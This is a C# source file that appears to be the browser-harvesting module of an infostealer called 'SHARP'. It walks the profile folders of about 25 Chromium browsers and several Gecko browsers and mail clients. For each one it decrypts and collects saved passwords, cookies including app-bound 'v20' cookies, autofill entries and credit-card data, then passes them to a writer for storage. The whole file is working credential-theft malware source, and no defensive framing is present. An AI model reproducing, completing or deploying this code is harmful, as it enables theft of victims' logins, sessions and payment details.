using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Browsers
    {
      private static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

      public static async Task ChromiumBrowsers()
      {
        Dictionary<string, string> paths = new Dictionary<string, string>()
        {
          {
            "Google",
            Path.Combine(Browsers.LocalApplicationData, "Google", "Chrome", "User Data")
          },
          {
            "Yandex",
            Path.Combine(Browsers.LocalApplicationData, "Yandex", "YandexBrowser", "User Data")
          },
          {
            "Edge",
            Path.Combine(Browsers.LocalApplicationData, "Microsoft", "Edge", "User Data")
          },
          {
            "Opera",
            Path.Combine(Browsers.ApplicationData, "Opera Software", "Opera Stable")
          },
          {
            "Opera GX",
            Path.Combine(Browsers.ApplicationData, "Opera Software", "Opera GX Stable")
          },
          {
            "Brave",
            Path.Combine(Browsers.LocalApplicationData, "BraveSoftware", "Brave-Browser", "User Data")
          },
          {
            "Chromium",
            Path.Combine(Browsers.LocalApplicationData, "Chromium", "User Data")
          },
          {
            "Dragon",
            Path.Combine(Browsers.LocalApplicationData, "Comodo", "Dragon", "User Data")
          },
          {
            "EpicPrivacy",
            Path.Combine(Browsers.LocalApplicationData, "Epic Privacy Browser", "User Data")
          },
          {
            "Iridium",
            Path.Combine(Browsers.LocalApplicationData, "Iridium", "User Data")
          },
          {
            "Slimjet",
            Path.Combine(Browsers.LocalApplicationData, "Slimjet", "User Data")
          },
          {
            "UR-Browser",
            Path.Combine(Browsers.LocalApplicationData, "UR Browser", "User Data")
          },
          {
            "Vivaldi",
            Path.Combine(Browsers.LocalApplicationData, "Vivaldi", "User Data")
          },
          {
            "Google(x86)",
            Path.Combine(Browsers.LocalApplicationData, "Google(x86)", "Chrome", "User Data")
          },
          {
            "MapleStudio",
            Path.Combine(Browsers.LocalApplicationData, "MapleStudio", "ChromePlus", "User Data")
          },
          {
            "7Star",
            Path.Combine(Browsers.LocalApplicationData, "7Star", "7Star", "User Data")
          },
          {
            "CentBrowser",
            Path.Combine(Browsers.LocalApplicationData, "CentBrowser", "User Data")
          },
          {
            "Chedot",
            Path.Combine(Browsers.LocalApplicationData, "Chedot", "User Data")
          },
          {
            "Kometa",
            Path.Combine(Browsers.LocalApplicationData, "Kometa", "User Data")
          },
          {
            "Elements Browser",
            Path.Combine(Browsers.LocalApplicationData, "Elements Browser", "User Data")
          },
          {
            "Uran",
            Path.Combine(Browsers.LocalApplicationData, "uCozMedia", "Uran", "User Data")
          },
          {
            "Amigo",
            Path.Combine(Browsers.LocalApplicationData, "Amigo", "User", "User Data")
          },
          {
            "Atom",
            Path.Combine(Browsers.LocalApplicationData, "Mail.Ru", "Atom", "User Data")
          },
          {
            "Torch",
            Path.Combine(Browsers.LocalApplicationData, "Torch", "User Data")
          },
          {
            "360Browser",
            Path.Combine(Browsers.LocalApplicationData, "360Browser", "Browser", "User Data")
          }
        };
        List<Task> taskList = new List<Task>();
        foreach (KeyValuePair<string, string> path in paths)
        {
          if (Directory.Exists(path.Value))
            taskList.Add(Browsers.RunChromiumBrowser(path));
        }
        await Task.WhenAll((IEnumerable<Task>) taskList);
        foreach (KeyValuePair<string, string> path in paths)
          await Browsers.RunBrowserv20(path);
        paths = (Dictionary<string, string>) null;
      }

      public static async Task GeckoBrowsers()
      {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        dictionary.Add("Thunderbird", Path.Combine(Browsers.ApplicationData, "Thunderbird", "Profiles"));
        dictionary.Add("SeaMonkey", Path.Combine(Browsers.ApplicationData, "Mozilla", "SeaMonkey", "Profiles"));
        dictionary.Add("Cyberfox", Path.Combine(Browsers.ApplicationData, "8pecxstudios", "Cyberfox", "Profiles"));
        dictionary.Add("K-Meleon", Path.Combine(Browsers.ApplicationData, "K-Meleon", "Profiles"));
        dictionary.Add("IceDragon", Path.Combine(Browsers.ApplicationData, "Comodo", "IceDragon", "Profiles"));
        dictionary.Add("Waterfox", Path.Combine(Browsers.ApplicationData, "Waterfox", "Profiles"));
        dictionary.Add("Firefox", Path.Combine(Browsers.ApplicationData, "Mozilla", "Firefox", "Profiles"));
        dictionary.Add("Postbox", Path.Combine(Browsers.ApplicationData, "Postbox", "Profiles"));
        dictionary.Add("Flock", Path.Combine(Browsers.ApplicationData, "Flock", "Browser"));
        List<Task> taskList = new List<Task>();
        foreach (KeyValuePair<string, string> path in dictionary)
        {
          if (Directory.Exists(path.Value))
            taskList.Add(Browsers.RunGeckoBrowser(path));
        }
        await Task.WhenAll((IEnumerable<Task>) taskList);
      }

      private static async Task RunGeckoBrowser(KeyValuePair<string, string> path)
      {
        await Task.Run((Func<Task>) (async () =>
        {
          CookieFormat[] cookies = await GBRWSR.GetCookies(path.Value);
          if (cookies.Length == 0)
            return;
          await Writer.WriteCookies(cookies, path.Key);
        }));
        if (!(path.Key == "Firefox"))
          ;
        else
        {
          PasswordFormat[] passwords = await GBRWSR.GetPasswords(path.Value);
          if (passwords.Length == 0)
            ;
          else
            await Writer.WritePasswords(passwords);
        }
      }

      private static async Task RunBrowserv20(KeyValuePair<string, string> path)
      {
        try
        {
          if (!Directory.Exists(path.Value))
            return;
          await Task.Run((Func<Task>) (async () =>
          {
            CookieFormat[] cookiesFromBrowser = await V20Collect.GetCookiesFromBrowser(path);
            if (cookiesFromBrowser.Length == 0)
              return;
            await Writer.WriteCookies(cookiesFromBrowser, path.Key);
          }));
        }
        catch (Exception ex)
        {
        }
      }

      private static async Task RunChromiumBrowser(KeyValuePair<string, string> path)
      {
        byte[] _encrKey = await BRWSR.GetEncryptionKey(path.Value);
        await Task.Run((Func<Task>) (async () =>
        {
          PasswordFormat[] passwords = await BRWSR.GetPasswords(path.Value, _encrKey);
          Console.WriteLine(passwords.Length.ToString());
          if (passwords.Length == 0)
            return;
          await Writer.WritePasswords(passwords);
        }));
        await Task.Run((Func<Task>) (async () =>
        {
          AutoFilesFormat[] autoFiles = await BRWSR.GetAutoFiles(path.Value);
          if (autoFiles.Length == 0)
            return;
          await Writer.WriteAutoFill(autoFiles, path.Key);
        }));
        await Task.Run((Func<Task>) (async () =>
        {
          CreditCardFormat[] creditCards = await BRWSR.GetCreditCards(path.Value, _encrKey);
          if (creditCards.Length == 0)
            return;
          await Writer.WriteCreditCards(creditCards, path.Key);
        }));
      }
    }
}
